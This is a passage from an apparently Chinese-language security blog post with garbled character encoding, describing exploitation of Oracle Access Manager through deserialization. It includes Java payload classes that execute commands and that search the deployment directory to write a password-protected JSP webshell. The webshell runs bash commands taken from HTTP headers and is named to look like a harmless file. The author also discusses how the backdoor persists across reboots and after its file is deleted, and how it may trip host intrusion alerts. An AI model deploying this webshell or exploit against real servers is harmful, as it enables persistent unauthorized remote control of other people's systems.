</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>sayhi</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>sayhi</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pwd&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        String result<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/tmp/cve/result.txt&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            PrintWriter out <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PrintWriter<span style=color:#f92672>(</span>result<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            out<span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>execCmd<span style=color:#f92672>(</span>cmd<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>            out<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>execCmd</span><span style=color:#f92672>(</span>String cmd<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>IOException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span> s <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span><span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmd<span style=color:#f92672>).</span><span style=color:#a6e22e>getInputStream</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>useDelimiter</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\\A&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>hasNext</span><span style=color:#f92672>()</span> <span style=color:#f92672>?</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>()</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ç»“æœï¼š</p><p><img loading=lazy src=image-20220708102316106.png alt=image-20220708102316106></p><p>è‡³æ­¤å¯ä»¥ç¡®è®¤å·¥ä½œç›®å½•æ˜¯ <code>/u01/oracle/user_projects/domains/access_domain</code> ã€‚é‚£ä¹ˆåªè¦ååºåˆ—åŒ–æ—¶åœ¨å½“å‰ç›®å½•ä¸‹é¢éå†æœç´¢æ‰¾åˆ° login_page.css æ–‡ä»¶ï¼Œå¹¶åœ¨åŒç›®å½•ä¸‹å†™å…¥neo.jspæ–‡ä»¶å°±å¯ä»¥é€šè¿‡ http://192.168.175.139:14100/oam/pages/css/neo.jsp è§£æå¹¶æ‰§è¡Œäº†ã€‚</p><p>éå†æœç´¢çš„æ–¹å¼æ€»å½’ä¸å¤Ÿä¼˜é›…ï¼Œå¦‚æœå‡ºç°åƒæˆ‘æœ¬åœ°å®ä¾‹ä¸Šé‚£æ ·å­˜åœ¨å¤šä¸ªéƒ¨ç½²ç›®å½•çš„æƒ…å†µå°±å¯èƒ½å†™ä¸‹å¤šä½™çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬é€šè¿‡é»‘ç›’ä¹Ÿä¸ä¼šçŸ¥é“è‡ªå·±çš„ä»£ç ç©¶ç«Ÿåœ¨å“ªäº›åœ°æ–¹å†™ä¸‹çš„æ–‡ä»¶ã€‚</p><p>äºæ˜¯ç»§ç»­æ¢ç´¢ï¼Œæ˜¯å¦æœ‰ä»€ä¹ˆæ–¹å¼å¯èƒ½é€šè¿‡é…ç½®æ–‡ä»¶æˆ–è€…ä»å½“å‰JVMä¸­è·å–é™æ€æ–‡ä»¶æ‰€åœ¨ç›®å½•å‘¢ï¼Ÿéšåå‘ç° <code>System.getProperties()</code> å¯ä»¥å¾—åˆ°å¾ˆå¤šå±æ€§ï¼Œå…¶ä¸­æ˜¯å¦æœ‰æˆ‘ä»¬å…³å¿ƒçš„ç›®å½•å‘¢ï¼Ÿ</p><p>ç»è¿‡ä¸€ç•ªè§‚å¯Ÿï¼Œå‘ç°é€šè¿‡ <code>oracle.deployed.app.dir</code> å¯ä»¥å¾—åˆ°éƒ¨ç½²ç›®å½•ï¼š</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-95-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-95-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>oracle.deployed.app.dir=/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220701113816075.png alt=image-20220701113816075></p><p>å‰è¿›äº†ä¸€æ­¥ï¼Œè¦æœç´¢çš„æ–‡ä»¶å¤¹ä» <code>/u01/oracle/user_projects/domains/access_domain</code> å˜æˆäº† <code>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user</code> ï¼Œ</p><p>è·ç¦»å®Œæ•´è·¯å¾„ <code>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam_server/xrd2uw/war/pages/css/login_page.css</code> è¿˜å·® <code>oam_server/xrd2uw/</code> è¿™ä¸€æ®µæ˜¯æœªçŸ¥çš„ã€‚</p><p>ä½†è‡³æ­¤å·²ç»å¯ä»¥å‹‰å¼ºå®ç°ä¸€ç§æ–¹æ¡ˆäº†ã€‚</p><h3 id=ä¼˜ç¼ºç‚¹-1>ä¼˜ç¼ºç‚¹<a hidden class=anchor aria-hidden=true href=#ä¼˜ç¼ºç‚¹-1>#</a></h3><p>ä¼˜ç‚¹</p><ol><li>åªéœ€è¦è§¦å‘ä¸€æ¬¡æ¼æ´ä¾¿å¯å¾—åˆ°æŒä¹…çš„webshellï¼ŒåŠ¨ä½œè¾ƒå°ã€‚</li><li>é‡å¯æœºå™¨webshellä»ç„¶å­˜åœ¨ã€‚</li></ol><p>ç¼ºç‚¹ï¼š</p><ol><li>æœ‰æ–‡ä»¶è½åœ°ï¼Œå¯èƒ½å¼•èµ·HIDSå‘Šè­¦ã€‚</li></ol><h3 id=æœ€ç»ˆæ•ˆæœ-1>æœ€ç»ˆæ•ˆæœ<a hidden class=anchor aria-hidden=true href=#æœ€ç»ˆæ•ˆæœ-1>#</a></h3><p><img loading=lazy src=image-20220701120623736.png alt=image-20220701120623736></p><p><img loading=lazy src=image-20220708111608658.png alt=image-20220708111608658></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-33>33</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>wjsp</span> <span style=color:#66d9ef>implements</span> Serializable <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>wjsp</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        String deploydir=&#34;/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user&#34;;
</span></span></span><span style=display:flex><span><span style=color:#75715e>//        String deploydir=&#34;/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam_server/xrd2uw/war/pages/css&#34;;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        String deploydir<span style=color:#f92672>=</span>System<span style=color:#f92672>.</span><span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;oracle.deployed.app.dir&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        loop<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span>deploydir<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>loop</span><span style=color:#f92672>(</span>File dir<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>File file<span style=color:#f92672>:</span>dir<span style=color:#f92672>.</span><span style=color:#a6e22e>listFiles</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>isFile</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>getAbsolutePath</span><span style=color:#f92672>().</span><span style=color:#a6e22e>endsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;login_page.css&#34;</span><span style=color:#f92672>)){</span>w<span style=color:#f92672>(</span>file<span style=color:#f92672>);}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>isDirectory</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>               loop<span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>getAbsoluteFile</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>w</span><span style=color:#f92672>(</span>File file<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>        File fjsp<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>getParent</span><span style=color:#f92672>(),</span><span style=color:#e6db74>&#34;clickjackingScriptbakup_9ik97.jsp&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        PrintWriter writer <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            writer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PrintWriter<span style=color:#f92672>(</span>fjsp<span style=color:#f92672>.</span><span style=color:#a6e22e>getAbsoluteFile</span><span style=color:#f92672>(),</span> <span style=color:#e6db74>&#34;UTF-8&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        String jsp=&#34;&lt;% if(\&#34;p4ssw0rd!\&#34;.equals(request.getParameter(\&#34;pwd\&#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\&#34;i\&#34;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\&#34;&lt;pre&gt;\&#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\&#34;&lt;/pre&gt;\&#34;); } %&gt;&#34;;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//betterjsp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        String jsp<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&lt;% if(\&#34;p4ssw0rd!\&#34;.equals(request.getHeader(\&#34;x-forwarded-fur\&#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(new String[]{\&#34;bash\&#34;,\&#34;-c\&#34;,request.getHeader(\&#34;x-forwarded-far\&#34;)}).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\&#34;&lt;pre&gt;\&#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\&#34;&lt;/pre&gt;\&#34;); } %&gt;&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        writer<span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>jsp<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        writer<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=wjspxjavaéå†ç›®å½•å¸è½½jspæœ¨é©¬>wjspx.javaï¼šéå†ç›®å½•å¸è½½jspæœ¨é©¬<a hidden class=anchor aria-hidden=true href=#wjspxjavaéå†ç›®å½•å¸è½½jspæœ¨é©¬>#</a></h2><h3 id=æ³¨æ„ç‚¹>æ³¨æ„ç‚¹<a hidden class=anchor aria-hidden=true href=#æ³¨æ„ç‚¹>#</a></h3><p>å¯ä»¥æ¨¡æ‹Ÿwjsp.javaçš„åšæ³•åˆ é™¤ç£ç›˜ä¸Šçš„æ–‡ä»¶ï¼Œä½†éœ€è¦æ³¨æ„ï¼š</p><ol><li>å¦‚æœåœ¨åˆ é™¤æ–‡ä»¶å‰è®¿é—®è¿‡webshellï¼Œjspæ–‡ä»¶å°±å·²ç»è½¬æˆclassï¼Œè·¯ç”±ä¹Ÿæ·»åŠ äº†ã€‚é‚£ä¹ˆåœ¨åˆ é™¤æ–‡ä»¶åªæ˜¯ä»ç£ç›˜ä¸Šé¢åˆ é™¤jspè€Œå·²ï¼Œåé—¨è¿˜æ˜¯å¯ä»¥è®¿é—®çš„ã€‚</li><li>é‡æ–°ä¸Šä¼ åŒåä½†æ˜¯å†…å®¹ä¸åŒçš„jspæ–‡ä»¶ï¼Œå¹¶ä¸ä¼šå†ç¼–è¯‘ä¸€æ¬¡å»è¦†ç›–å·²æœ‰çš„classï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³•æ›´æ–°webshellçš„åŠŸèƒ½æˆ–è€…å¯†ç ã€‚</li></ol><h3 id=æœ€ç»ˆæ•ˆæœ-2>æœ€ç»ˆæ•ˆæœ<a hidden class=anchor aria-hidden=true href=#æœ€ç»ˆæ•ˆæœ-2>#</a></h3><p><img loading=lazy src=image-20220701160151632.png alt=image-20220701160151632></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-13>13</a>
